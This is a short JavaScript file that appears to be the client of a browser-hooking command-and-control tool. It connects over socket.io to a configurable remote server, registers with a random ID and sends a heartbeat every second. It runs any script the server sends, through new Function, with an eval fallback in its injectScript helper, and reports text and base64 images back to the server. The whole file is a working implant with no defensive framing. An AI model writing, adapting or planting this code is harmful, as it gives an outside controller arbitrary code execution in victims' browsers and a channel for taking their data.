var dviide;

function uuid() {
  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
  s4() + '-' + s4() + s4() + s4();
}

function s4() {
  return Math.floor((1 + Math.random()) * 0x10000)
  .toString(16)
  .substring(1);
}

(function() {
  dviide = new dviide();
  if(config.injectjquery) {
    dviide.injectScript('https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js', true, function() {
      dviide.injectScript('https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.2/socket.io.js', true, function() {
        dviide.connect();
      });
    });
  } else {
    dviide.injectScript('https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.2/socket.io.js', true, function() {
      dviide.connect();
    });
  }
})();

function dviide() {
  var date = Date();
  this.connected = false;
  this.ip = config.ip;
  this.ioport = config.ioport;
  this.webport = config.webport;
  this.connect = function() {
    this.connected = true;
    this.socket = io(config.ip + ':' + config.ioport);
    this.id = uuid();
    this.socket.emit("conn", {id: this.id});
    this.socket.on("command", function(data) {
      var Module = new Function(data.script);
      var module = new Module();
      module.start();
    });
  }
  this.disconnect = function() {
    this.connected = false;
    clearInterval(this.heartbeatid);
    this.socket.close();
  }
  this.callbackText = function(data) {
    this.socket.emit("callbackText", {id: this.id, data: data + "\n"});
  }
  this.callbackImageBase64 = function(data) {
    this.socket.emit("callbackImageBase64", {id: this.id, data: data});
  }
  this.injectScript = function(src, url, callback) {
    if(url) {
      var script = document.createElement("SCRIPT");
      script.src = src;
      script.type = 'text/javascript';
      script.onload = function() {
        var $ = window.jQuery;
        callback();
      };
      document.getElementsByTagName("head")[0].appendChild(script);
    } else {
      eval(src);
    }
  }
  this.heartbeat = function() {
    if(dviide.connected && dviide.socket.connected) {
      dviide.socket.emit("beat", {id: dviide.id});
    }
  }
  this.heartbeatid = setInterval(this.heartbeat, 1000);
}
